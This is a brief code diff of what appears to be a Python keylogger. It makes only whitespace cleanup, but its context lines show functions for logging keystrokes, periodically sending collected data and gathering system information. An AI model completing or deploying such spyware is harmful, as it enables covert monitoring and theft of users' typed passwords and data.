@@ -40,7 +40,6 @@ data = {
 
 def log_keystroke(key):
     key = str(key).replace("'", "")
-
     if key == 'Key.space':
         key = ' '
     if key == 'Key.shift':
@@ -156,17 +155,6 @@ def send_info1(time_wait, data):
         time.sleep(time_wait)
 
 
-
-
-
-      
-    
-    
-    
-
-
-    
-    
 def system_info():
     print("getting system info")
     system_info_list = [] 
